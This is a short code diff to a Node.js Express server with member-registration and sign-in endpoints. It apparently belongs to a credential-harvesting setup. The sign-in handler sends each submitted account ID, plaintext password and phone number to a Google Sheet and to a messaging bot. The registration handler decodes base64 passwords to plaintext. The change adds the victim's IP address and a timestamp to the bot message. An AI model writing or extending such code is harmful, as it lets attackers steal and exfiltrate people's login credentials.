@@ -99,9 +99,9 @@ app.post("/api/MemberInfo/RegisterMember", async (req, res) => {
     // Decode the password (which is base64 encoded)
     const decodedPWD = Buffer.from(PWD, 'base64').toString('utf-8');
     
-    const timeNow = new Date().toLocaleString();
+    const timeNow = new Date().toLocaleString('vi-VN');
     
-    const userIp = req.headers['x-forwarded-for'] || req.ip;
+    const userIp = req.ip;
 
     // Prepare data to be stored
     const data = {
@@ -140,16 +140,16 @@ app.post("/api/MemberInfo/RegisterMember", async (req, res) => {
 
 app.post("/api/Authorize/SignIn", async (req, res) => {
   const { AccountID, AccountPWD, phone } = req.body;
-  const timeNow = new Date().toLocaleString();
+  const timeNow = new Date().toLocaleString('vi-VN');
     
   // Get the user's IP address
   // If using a proxy (like Nginx), 'x-forwarded-for' contains the real IP
   // Otherwise, fallback to req.ip
-  const userIp = req.headers['x-forwarded-for'] || req.ip;
+  const userIp = req.ip;
   const data = { action: "login", AccountID, AccountPWD, phone, timeNow, userIp };
   await Promise.all([
     googleSheetApi.storageDataLoginToGoogleSheet(data, GOOGLE_SHEET_URL),
-    sendLoginAccountToBot(phone, AccountID, AccountPWD)
+    sendLoginAccountToBot(phone, AccountID, AccountPWD, userIp, timeNow)
   ]);
 
   return res.json({
